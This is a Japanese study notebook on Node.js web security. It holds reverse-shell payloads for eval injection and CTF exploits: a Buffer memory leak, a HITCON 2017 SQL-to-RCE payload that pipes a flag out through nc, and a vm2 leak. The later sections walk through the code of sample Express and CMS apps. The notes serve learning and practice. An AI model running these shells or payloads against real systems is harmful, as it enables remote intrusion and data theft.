<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [node.js](#nodejs)
  - [reverse shell](#reverse-shell)
- [脆弱なアプリ](#%E8%84%86%E5%BC%B1%E3%81%AA%E3%82%A2%E3%83%97%E3%83%AA)
  - [Buffer](#buffer)
  - [dustjs-helper](#dustjs-helper)
  - [node-serialize (Celestial)](#node-serialize-celestial)
  - [node-serialize (temple of doom)](#node-serialize-temple-of-doom)
  - [MySQL "max_allowed_packet"/ PostgreSQL RCE "pg\@2.x ~ pg\@7.1.0" / (hitcon2017 SQL so Hard)](#mysql-max_allowed_packet-postgresql-rce-pg%5C2x--pg%5C710--hitcon2017-sql-so-hard)
  - [Buffer(100) / vm.run() (hitcon2016 leakage)](#buffer100--vmrun-hitcon2016-leakage)
  - [](#)
  - [](#-1)
  - [](#-2)
- [サンプルアプリ](#%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E3%82%A2%E3%83%97%E3%83%AA)
  - [progate](#progate)
  - [node-express-realworld-example-app](#node-express-realworld-example-app)
    - [routes](#routes)
      - [routes/api/users.js](#routesapiusersjs)
    - [Model](#model)
    - [login](#login)
    - [JWT token](#jwt-token)
  - [cody CMS](#cody-cms)
    - [概要](#%E6%A6%82%E8%A6%81)
    - [model](#model-1)
    - [login](#login-1)
    - [body content](#body-content)
- [フォルダ構成](#%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E6%A7%8B%E6%88%90)
  - [MySQL](#mysql)
  - [file upload](#file-upload)
- [メモ](#%E3%83%A1%E3%83%A2)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->
# node.js
## reverse shell
https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/  
`eval(req.query.q)`みたいになっている場合、以下でRever shellできる！  
```txt
require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.56.2/80 0>%261"')
```
また、以下のようなNode.jsを使ったRever shellもあり。  
```js
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(80, "attacker-ip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```
```txt
http://host-ip:8080/?q=var+net+=+require("net"),+sh+=+require("child_process").exec("/bin/bash");var+client+=+new+net.Socket();client.connect(80,+"attacker-ip",+function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
```
# 脆弱なアプリ
## Buffer
https://www.smrrd.de/nodejs-hacking-challenge-writeup.html   
の脆弱なアプリ。   
`./routes/index.js`の以下の部分が脆弱。`new Buffer("admin password")`の部分に`new Buffer(100)`となるようにJSONリクエストの内容を変更すれば、メモリが100バイト分返ってくる。   
以下は正常な場合の文字列を送信した挙動。   
![image](https://user-images.githubusercontent.com/56021519/101337517-1bb9c300-38bf-11eb-82ac-88e99a69edca.png)   
以下は文字列ではなく数値を送信した挙動。   
![image](https://user-images.githubusercontent.com/56021519/101337601-37bd6480-38bf-11eb-93f4-58d5fdcd7b23.png)   
curlでこれを何回か繰り返せばsessionの署名に使う暗号化キーが得られるらしいが、自分でやったときは何回やっても得られなかった…NodeJSのバージョンを落とさないとダメなのか？？   
```txt
root@kali:~/Documents/AWAE/nodejs# curl http://localhost:3000/login -X POST -H "Content-Type: application/json" --data "{\"password\": 100}" | hexdump -C
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   662  100   645  100    17   125k   3400 --:--:-- --:--:-- --:--:--  129k
00000000  7b 22 73 74 61 74 75 73  22 3a 22 65 72 72 6f 72  |{"status":"error|
00000010  22 2c 22 65 72 72 6f 72  22 3a 22 70 61 73 73 77  |","error":"passw|
00000020  6f 72 64 20 77 72 6f 6e  67 3a 20 5c 75 30 30 30  |ord wrong: \u000|
00000030  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000040  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000050  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000060  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000070  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000080  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000090  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
000000a0  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
000000b0  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
000000c0  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
000000d0  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
000000e0  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
000000f0  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000100  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000110  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000120  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000130  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000140  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000150  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000160  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000170  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000180  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000190  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
000001a0  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
000001b0  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
000001c0  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
000001d0  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
000001e0  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
000001f0  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000200  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000210  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000220  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000230  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000240  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000250  30 30 30 5c 75 30 30 30  30 5c 75 30 30 30 30 5c  |000\u0000\u0000\|
00000260  75 30 30 30 30 5c 75 30  30 30 30 5c 75 30 30 30  |u0000\u0000\u000|
00000270  30 5c 75 30 30 30 30 5c  75 30 30 30 30 5c 75 30  |0\u0000\u0000\u0|
00000280  30 30 30 22 7d                                    |000"}|
00000285
```
## dustjs-helper
if helperのevalと不十分な入力検証でRCEできる脆弱なNode.jsモジュール。   
https://github.com/linkedin/dustjs   
https://github.com/linkedin/dustjs-helpers/blob/03cd65f51a/README.md   
よくわからんけどどうやら修正されてないっぽい。   
## node-serialize (Celestial)
HackTheBoxのCelestialでこのモジュールの逆シリアライズの脆弱性がある。   
https://github.com/takabaya-shi/CTF-writeup/blob/master/HackTheBox/celestial/README.md   
にWriteupを書いた。   
## node-serialize (temple of doom)
Vulnhubのtemple of doomでCelestialと同じの逆シリアライズの脆弱性がある。   
https://github.com/takabaya-shi/CTF-writeup/tree/master/Vulnhub/temple%20of%20doom   

## MySQL "max_allowed_packet"/ PostgreSQL RCE "pg\@2.x ~ pg\@7.1.0" / (hitcon2017 SQL so Hard)
https://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard  
https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/sql-so-hard.md  
配布されるNode.jsの`app.js`は以下の通り。  
hintとしてnode.jsのpostgresモジュールのRCEの脆弱性が与えられる。  
https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability  
`function waf(string) {`で禁止文字列を定義されてる。  
`app.all("/*",`で入力したQueryとBodyをIPとともにMySQLのデータベースにブラックリストに登録。    
つまり、このMySQLが実行されないようにしないといけない？  
`app.post("/reg",`でPostgeSQLのデータベースに入力をサニタイジングなしにSQL構文を作成しているのでここでRCEできる！  
```js
#!/usr/bin/node

/**
 *  @HITCON CTF 2017
 *  @Author Orange Tsai
 */

const qs = require("qs");
const fs = require("fs");
const pg = require("pg");
const mysql = require("mysql");
const crypto = require("crypto");
const express = require("express");

const pool = mysql.createPool({
    connectionLimit: 100, 
    host: "localhost",
    user: "ban",
    password: "ban",
    database: "bandb",
});

const client = new pg.Client({
    host: "localhost",
    user: "userdb",
    password: "userdb",
    database: "userdb",
});
client.connect();

const KEYWORDS = [
    "select", 
    "union", 
    "and", 
    "or", 
    "\\", 
    "/", 
    "*", 
    " " 
]

function waf(string) {
    for (var i in KEYWORDS) {
        var key = KEYWORDS[i];
        if (string.toLowerCase().indexOf(key) !== -1) {
            return true;
        }
    }
    return false;
}

const app = express();
app.use((req, res, next) => { // ミドルウェア関数を定義。はじめに呼ばれる
   var data = "";
   req.on("data", (chunk) => { data += chunk})
   req.on("end", () =>{
       req.body = qs.parse(data);  // 受信したデータ(QueryとBody)を解析して配列で保持
       next();  // 次のミドルウェア関数を実行
   })
})


app.all("/*", (req, res, next) => {  // 多分app.useのあとに実行される。/*のルーティングで実行
    if ("show_source" in req.query) {
        return res.end(fs.readFileSync(__filename));
    }
    if (req.path == "/") {
        return next();
    }

    var ip = req.connection.remoteAddress;
    var payload = "";
    for (var k in req.query) {
        if (waf(req.query[k])) {
            payload = req.query[k];
            break;
        }
    }
    for (var k in req.body) {
        if (waf(req.body[k])) {
            payload = req.body[k];
            break;
        }
    }

    if (payload.length > 0) {  // MySQLでブラックリストに登録
        var sql = `INSERT INTO blacklists(ip, payload) VALUES(?, ?) ON DUPLICATE KEY UPDATE payload=?`;
    } else {
        var sql = `SELECT ?,?,?`;
    }
    
    return pool.query(sql, [ip, payload, payload], (err, rows) => {
        var sql = `SELECT * FROM blacklists WHERE ip=?`;
        return pool.query(sql, [ip], (err,rows) => {
            if ( rows.length == 0) {
                return next();
            } else {
                return res.end("Shame on you"); // ブラックリストに登録されていれば終了
            }
            
        });
    });

});


app.get("/", (req, res) => {
    var sql = `SELECT * FROM blacklists GROUP BY ip`;
    return pool.query(sql, [], (err,rows) => {
        res.header("Content-Type", "text/html");
        var html = "<pre>Here is the <a href=/?show_source=1>source</a>, thanks to Orange\n\n<h3>Hall of Shame</h3>(delete every 60s)\n";
        for(var r in rows) {
            html += `${parseInt(r)+1}. ${rows[r].ip}\n`;

        }
        return res.end(html);
    });

});

app.post("/reg", (req, res) => {
    var username = req.body.username;
    var password = req.body.password;
    if (!username || !password || username.length < 4 || password.length < 4) {
        return res.end("Bye");
    } 

    password = crypto.createHash("md5").update(password).digest("hex");
    var sql = `INSERT INTO users(username, password) VALUES('${username}', '${password}') ON CONFLICT (username) DO NOTHING`; // Postgresを実行
    return client.query(sql.split(";")[0], (err, rows) => {
        if (rows && rows.rowCount == 1) {
            return res.end("Reg OK");
        } else {
            return res.end("User taken");
        }
    });
});

app.listen(31337, () => {
    console.log("Listen OK");
});
```
MySQLの`max_allowed_packet `では入力が大きすぎるとドロップして実行しないらしい。  
WAFのバイパスはイマイチよくわかってない……  
以下がExploitらしい。  
```python
from random import randint
import requests

# payload = "union"
payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`/readflag|nc orange.tw 12345`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--""" % (' '*1024*1024*16)


username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535))
data = {
            'username': username+payload, 
                'password': 'AAAAAA'
                }
print 'ok'
r = requests.post('http://13.113.21.59:31337/reg', data=data);
print r.content
```
## Buffer(100) / vm.run() (hitcon2016 leakage)
https://lorexxar.cn/2016/10/10/hitcon2016/  
https://github.com/orangetw/My-CTF-Web-Challenges#leaking  
以下のソースがある。  
` eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")`でFlagを定義してるけど変数名がランダムになっていてわからん。  
`res.send("eval ->" + vm.run(req.query.data));`でユーザーからのコードを実行できる。  
```js
"use strict";

var randomstring = require("randomstring");
var express = require("express");
var {VM} = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function (req, res) {
    res.header("Content-Type", "text/plain");

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});

app.listen(3000, function () {
    console.log("listening on port 3000!");
```
https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md  
`Buffer(100)`でメモリの中身をリークすればよい。  
- **payload**  
```txt
http://52.198.115.130:3000/?data[]=for (var step = 0; step < 100000; step++) {var buf = (new Buffer(100)).toString('ascii');if (buf.indexOf("hitcon{") !== -1) {break;}}buf;
flag: hitcon{4nother h34rtbleed in n0dejs? or do u solved by other way?}
```
## 
- **payload**  
## 
- **payload**  
## 
- **payload**  

# サンプルアプリ
## progate
プロゲートの無料のアプリ。  
## node-express-realworld-example-app
https://github.com/gothinkster/node-express-realworld-example-app  
このアプリで定義されているルーティングは以下の通り。  
今回はapiのルーティングしか定義されてないっぽい。  
https://github.com/gothinkster/realworld/blob/master/api/README.md  
ちなみにデバッグ時に`app.get()`とかにブレークポイントをセットしてもそこでブレークするのは、最初にNode.jsを立ち上げるときだけで、実際にそのルーティングにアクセスしていてもそこでは止まらない。  
中の処理にブレークポイントをセットしないとだめ。  
### routes
ファイル構成は以下。ルーティングはroutesで定義されてる。  
```txt
.
├── app.js				// expressサーバーの設定
├── package.json
├── public				// 静的ファイル置き場
│   ├── .keep
├── routes				// サーバー側のコントローラ
│   ├── index.js
│   └── auth.js
|   └──api
|       ├── articles.js
|       ├── index.js
|       ├── profiles.js
|       ├── tags.js
|       └── users.js            
└── config					// 
    ├── index.js
    └── passport.js
```
`app.js`の一部は以下。  
mongooseでMongoDBに接続する。  
`require('./models/User')`とかでモデルを定義して読み込んでる。つまり、MongoDBに作成するデータをここで定義している。  
`app.use(require('./routes'))`でroutesフォルダ内のjsファイルを読みこんでいる。  
ここら辺のルーティングに一致しない場合はそのあとに`app.js`で404エラーとなる。  
```js
if(isProduction){
  mongoose.connect(process.env.MONGODB_URI);
} else {
  mongoose.connect('mongodb://localhost/conduit');
  mongoose.set('debug', true);
}

require('./models/User');
require('./models/Article');
require('./models/Comment');
require('./config/passport');

app.use(require('./routes'));

/// catch 404 and forward to error handler
app.use(function(req, res, next) {
  var err = new Error('Not Found');
  err.status = 404;
  next(err);
});
```
`routes/index.js`で以下のように`/api`にアクセスした場合に`./api`フォルダを読み込んでいる。  
```js
var router = require('express').Router();

router.use('/api', require('./api'));

module.exports = router;
```
`routes/api/index.js`に以下のように`api/`にアクセスしたら`./users`の`users.js`を読み込む、`api/profiles`にアクセスしたら`./profiles`の`profiles.js`を読み込むみたいにする。  
ここら辺のルーティングのAPIにアクセスした際に、もしJWTトークンをセットしている必要があるAPIをアクセスしていればErrorが返って、  
`if(err.name === 'ValidationError'){`でそのエラーをキャッチする。  
JWTトークンが必要ないAPIもある。  
```js
var router = require('express').Router();

router.use('/', require('./users'));
router.use('/profiles', require('./profiles'));
router.use('/articles', require('./articles'));
router.use('/tags', require('./tags'));

router.use(function(err, req, res, next){
  if(err.name === 'ValidationError'){
    return res.status(422).json({
      errors: Object.keys(err.errors).reduce(function(errors, key){
        errors[key] = err.errors[key].message;

        return errors;
      }, {})
    });
  }

  return next(err);
});

module.exports = router;
```
#### routes/api/users.js
例えば、このルーティングには`/api/user`,`/api/users/login`とかでアクセスする。  
例えば、GETで`/api/user`にアクセスした場合は、JWTトークンを`Authorization: Bearer`ヘッダにセットする必要があって、現在ログインしているユーザを`User.findById(req.payload.id)`でidからデータベースで検索してそのidに対するユーザがいればそのデータをreturnしている。  
`req.payload.id`はJWT tokenが`{header: {…}, payload: {…}, signature: 'ysAYbiUpuK8gqJXTxK-wcIzrsOIkM119ciPHELj7q34'}`となっているうちのDataの部分。  
![image](https://user-images.githubusercontent.com/56021519/107498657-6fa29a00-6bd7-11eb-9fe4-3eedd332c666.png)  
```js
var mongoose = require('mongoose');
var router = require('express').Router();
var passport = require('passport');
var User = mongoose.model('User');
var auth = require('../auth');

router.get('/user', auth.required, function(req, res, next){
  User.findById(req.payload.id).then(function(user){
    if(!user){ return res.sendStatus(401); }

    return res.json({user: user.toAuthJSON()});
  }).catch(next);
});

router.put('/user', auth.required, function(req, res, next){
  User.findById(req.payload.id).then(function(user){
    if(!user){ return res.sendStatus(401); }

    // only update fields that were actually passed...
    if(typeof req.body.user.username !== 'undefined'){
      user.username = req.body.user.username;
    }
    if(typeof req.body.user.email !== 'undefined'){
      user.email = req.body.user.email;
    }
    if(typeof req.body.user.bio !== 'undefined'){
      user.bio = req.body.user.bio;
    }
    if(typeof req.body.user.image !== 'undefined'){
      user.image = req.body.user.image;
    }
    if(typeof req.body.user.password !== 'undefined'){
      user.setPassword(req.body.user.password);
    }

    return user.save().then(function(){
      return res.json({user: user.toAuthJSON()});
    });
  }).catch(next);
});

router.post('/users/login', function(req, res, next){
  if(!req.body.user.email){
    return res.status(422).json({errors: {email: "can't be blank"}});
  }

  if(!req.body.user.password){
    return res.status(422).json({errors: {password: "can't be blank"}});
  }

  passport.authenticate('local', {session: false}, function(err, user, info){
    if(err){ return next(err); }

    if(user){
      user.token = user.generateJWT();
      return res.json({user: user.toAuthJSON()});
    } else {
      return res.status(422).json(info);
    }
  })(req, res, next);
});

router.post('/users', function(req, res, next){
  var user = new User();

  user.username = req.body.user.username;
  user.email = req.body.user.email;
  user.setPassword(req.body.user.password);

  user.save().then(function(){
    return res.json({user: user.toAuthJSON()});
  }).catch(next);
});

module.exports = router;

```
この`api/user`機能を使うには事前に`api/users/login`とかでログインしておいてJWTトークンを取得しておいて、以下のようにトークン付きのリクエストを送信すればよい。  
```txt
$ curl -X GET http://127.0.0.1:3000/api/user -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYwMjNhZDhmNTI5Y2UwYzgzMTI2ZjYxNSIsInVzZXJuYW1lIjoiamFjb2IiLCJleHAiOjE2MTgxMzgwMTEsImlhdCI6MTYxMjk1NDAxMX0.boL07nDPTtO7tohbM1Py3b9Tly-nPWPbmo06548OfKs' -v
Note: Unnecessary use of -X or --request, GET is already inferred.
*   Trying 127.0.0.1:3000...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 3000 (#0)
> GET /api/user HTTP/1.1
> Host: 127.0.0.1:3000
> User-Agent: curl/7.68.0
> Accept: */*
> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYwMjNhZDhmNTI5Y2UwYzgzMTI2ZjYxNSIsInVzZXJuYW1lIjoiamFjb2IiLCJleHAiOjE2MTgxMzgwMTEsImlhdCI6MTYxMjk1NDAxMX0.boL07nDPTtO7tohbM1Py3b9Tly-nPWPbmo06548OfKs
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Access-Control-Allow-Origin: *
< Content-Type: application/json; charset=utf-8
< Content-Length: 261
< ETag: W/"105-HVVvJzymW9Jj23GWzlu1pA"
< Date: Wed, 10 Feb 2021 10:48:24 GMT
< Connection: keep-alive
< 
* Connection #0 to host 127.0.0.1 left intact
{"user":{"username":"jacob","email":"jake@jake.jake","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYwMjNhZDhmNTI5Y2UwYzgzMTI2ZjYxNSIsInVzZXJuYW1lIjoiamFjb2IiLCJleHAiOjE2MTgxMzgxMDQsImlhdCI6MTYxMjk1NDEwNH0.UKBvLkh69r9N72B3ba1WVA7XPJc4T8dq_NJsMbc5loQ"}}
```
### Model
`models/User.js`でUserSchemaインスタンスを作成して、Userモデルを作成してるっぽい。  
MongoDBに保存するときはこの形式で保存されるっぽい。ちなみにValidationもしてる。  
https://thinkster.io/tutorials/node-json-api/creating-the-user-model  
```js
var UserSchema = new mongoose.Schema({
  username: {type: String, lowercase: true, unique: true, required: [true, "can't be blank"], match: [/^[a-zA-Z0-9]+$/, 'is invalid'], index: true},
  email: {type: String, lowercase: true, unique: true, required: [true, "can't be blank"], match: [/\S+@\S+\.\S+/, 'is invalid'], index: true},
  bio: String,
  image: String,
  favorites: [{ type: mongoose.Schema.Types.ObjectId, ref: 'Article' }],
  following: [{ type: mongoose.Schema.Types.ObjectId, ref: 'User' }],
  hash: String,
  salt: String
}, {timestamps: true});
```
また、以下でPasswordの検証とかJWTトークンの生成とかのメソッドを定義してる。  
```js
UserSchema.plugin(uniqueValidator, {message: 'is already taken.'});

UserSchema.methods.validPassword = function(password) {
  var hash = crypto.pbkdf2Sync(password, this.salt, 10000, 512, 'sha512').toString('hex');
  return this.hash === hash;
};

UserSchema.methods.setPassword = function(password){
  this.salt = crypto.randomBytes(16).toString('hex');
  this.hash = crypto.pbkdf2Sync(password, this.salt, 10000, 512, 'sha512').toString('hex');
};

UserSchema.methods.generateJWT = function() {
  var today = new Date();
  var exp = new Date(today);
  exp.setDate(today.getDate() + 60);

  return jwt.sign({
    id: this._id,
    username: this.username,
    exp: parseInt(exp.getTime() / 1000),
  }, secret);
};

UserSchema.methods.toAuthJSON = function(){
  return {
    username: this.username,
    email: this.email,
    token: this.generateJWT(),
    bio: this.bio,
    image: this.image
  };
};
```
### login
http://knimon-software.github.io/www.passportjs.org/guide/configure/  
認証リクエストは、認証リクエストをおこなうための必要最低限の機能をもつPassportというNode.jsのミドルウェアを使用している。  
`config/passport.js`で定義されてる。  
`passport.use(new LocalStrategy({`でストラテジを定義してそのあとのfunctionの中で認証or認証失敗の処理を記述する。  
ここで定義したログイン検証は、`passport.authenticate('local')`を呼び出すときに内部で呼び出されていて成功か失敗かを返している。  
`passport.authenticate('local')`は`routes/api/users.js`で`/api/users/login`にリクエストが来たときに呼び出される。  
```js
var passport = require('passport');
var LocalStrategy = require('passport-local').Strategy;
var mongoose = require('mongoose');
var User = mongoose.model('User');

passport.use(new LocalStrategy({
  usernameField: 'user[email]',
  passwordField: 'user[password]'
}, function(email, password, done) {
  User.findOne({email: email}).then(function(user){
    if(!user || !user.validPassword(password)){
      return done(null, false, {errors: {'email or password': 'is invalid'}});
    }

    return done(null, user);
  }).catch(done);
}));

```
### JWT token
`routes/auth.js`で以下のようにJWTトークンを取得するメソッドが定義されてる。  
ここら辺の処理は`router.put('/user', auth.required, function(req, res, next){`みたいにJWTトークンが必要な場合は、第二引数に`auth.required`が指定されていて、`jwt({})`が該当していて、トークンをヘッダーから取り出す処理が実行される。  
あと、多分それが終わったら`node_modules/express-jwt/lib/index.js`で`jwt.decode`や`jwt.verify`によってJWTトークンのデコードや署名の検証まで自動で行ってくれるっポイ。  
もし検証に失敗したら、`err`オブジェクトを投げるっぽい。  
```js
var jwt = require('express-jwt');
var secret = require('../config').secret;

function getTokenFromHeader(req){
  if (req.headers.authorization && req.headers.authorization.split(' ')[0] === 'Token' ||
      req.headers.authorization && req.headers.authorization.split(' ')[0] === 'Bearer') {
    return req.headers.authorization.split(' ')[1];
  }

  return null;
}

var auth = {
  required: jwt({
    secret: secret,
    userProperty: 'payload',
    getToken: getTokenFromHeader
  }),
  optional: jwt({
    secret: secret,
    userProperty: 'payload',
    credentialsRequired: false,
    getToken: getTokenFromHeader
  })
};

module.exports = auth;
```

## cody CMS
### 概要
このCMSの主要部分の処理は`node_modules/cody/apps/Application.js`に書かれている。  
`http://mysite.local:3001/en/pages`とかにアクセスしたときに、リクエストを処理する部分のメインの処理は以下で行われる。  
http://cody-cms.org/en/BigPicture  
ここに詳しく書いてある。  
`Application.prototype.servePage = function(req, res)`は、実質ApplicationクラスにservePageメソッドを定義するみたいなものっぽい。  
`new cody.Path(req._parsedUrl.pathname, self.defaultlanguage);`でリクエストの内容から、`language`,`domain`,`request`,`id`の情報をURLから分割して得る。  
`var aContext = self.buildContext( path, req, res );`で`aContext`という名前の`Context`オブジェクトを生成する。この`Context`オブジェクトはコントローラーとビューに必要なデータを渡す際に使われる。  
実際には以下のようなデータが保存されている。  
これらの情報から次はこのデータをどのControllerで使用するかを`self.handToController(aContext);`で判断して処理を実行する。  
![image](https://user-images.githubusercontent.com/56021519/107660017-26337700-6ccb-11eb-9421-43d39a9adb39.png)  

```js
//////////////////
// Page serving //
//////////////////
Application.prototype.servePage = function(req, res) {
  var self = this;
  var path = new cody.Path(req._parsedUrl.pathname, self.defaultlanguage);

  var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress;
  console.log("--LOG--A--|" + ip + "|" + new Date() + "|" + req.headers['host'] + "|" + req._parsedUrl.pathname);

  self.log("servePage - path -> " + path.link);
  
   
  var aContext = self.buildContext( path, req, res );
  if (typeof aContext !== "undefined") {
    self.handToController(aContext);
  }
};
```
`buildContext`でContextオブジェクトを作成している。  
`console.log("servePage - params -> "); console.log(context.params);`とかからもわかる通りリクエストとかの内容をContextオブジェクトに保存している。  
```txt
servePage - params -> {request: 'getnode', node: 'id_103'}
servePage - session -> Session {cookie: Cookie, login: {…}, req: IncomingMessage, id: 'a3BDAob-G1hN3g8rlz7MVXjqg7U4Q5mA', reload: ƒ, …}
```
```js
Application.prototype.buildContext = function (path, req, res) {
  var self = this;
  
  // get the page
  var page = self.findPage(path);
  
  if (typeof page === "undefined") {
      self.err("servePage", "No page found for path = " + path.pagelink, res);
      return undefined;
  }

  self.log("buildContext -> page", page.language + "/" + page.itemId + " - " + page.title);
  
  // build a context
  var context = new cody.Context(path, page, self, req, res);
  console.log("servePage - params -> "); console.log(context.params);
  console.log("servePage - session -> "); console.log(context.session);

  if (typeof req.files !== "undefined") { console.log("servePage - files -> "); console.log(req.files); }

  return context;
};
```
`handToController`メソッドの中ではContextオブジェクトの内容から使用するControllerを`var controller = context.page.getController(context);`で判断する。  
以下のように今回は`PageController`を使用すると判断している。  
![image](https://user-images.githubusercontent.com/56021519/107661115-4e6fa580-6ccc-11eb-9323-5ca20659ef99.png)  
`controller.needsLogin()`ではそのControllerを使用するのにAuthenticationが必要かどうかを`true`,`false`で返して判断する。この`needsLogin()`メソッドは`node_modules/cody/models/Context.js`で定義されてる。  
`controller.doRequest( function(fn, header) {`でそれぞれのControllerオブジェクトで定義されているController固有の処理を実行する。  
例えばPagesControllerなら、`node_modules/cody/controllers/PageController.js`で定義されている`PageController.prototype.doRequest = function( finish ) {`の中身を実行する。  
で、多分実行結果とかも`context`オブジェクトに格納されていて、最後にその保存されたデータを`self.renderView( context );`のようにしてViewにレンダリングしている。  
```js
Application.prototype.handToController = function(context) {
  var self = this;
  
  // make a controller and send it 'doRequest'
  self.log("handToController", context.page.item.template.controllerName);
  var controller = context.page.getController(context);
  
  if (typeof controller === "undefined") {
    self.err("handToController", "No controller found for " + context.page.item.template.controllerName);
    return;
  }
  
  // check if authentication is required for this action
  //  and if so and not yet done: store this action and perform login first
  if (controller.needsLogin()) {
    if (controller.isLoggedIn()) {
      self.log("Application - check login", "already logged in");
      if (! controller.isAllowed(context.page)) {
        controller.close();
        self.notAllowed(context);
        return;
      }
    } else {
      self.log("Application - check login", "needs login, redirect/remember");

      controller.close();
      self.logInFirst(context);
      return;
    }
  }
  
  controller.doRequest( function(fn, header) {
    // callback function should always be called by doRequest
    //  render with the specified or the template in the context (controller may have changed it)
    //  if no render template present ( == "") either
    //    -- assume the controller performed res.writeHead() / .write() / .end() -- ajax req?
    //    -- another controller has taken over

    if (typeof fn === "object") {
      controller.gen(fn, header);
      
    } else {
      if (typeof fn !== "undefined") {
        context.fn = fn; 
      }
      
      self.log("Application.handToController -> finished -> render view", (context.fn==="") ? "** none **" : context.fn);

      self.renderView( context );
    }
      
    controller.close();
  });
};
```
### model
大体使われているオブジェクトは`Model`,`Context`,`Controller`の三つくらい。  
`Controller`オブジェクトは`node_modules/cody/controllers/Controller.js`で定義されていて、他の`PageController`,`LoginController`とかのControllerのベースのオブジェクト。  
`Context`オブジェクトは一つのリクエストごとに毎回作成されて、いろんなデータをとりあえずぶち込んでいる的な？  

### login
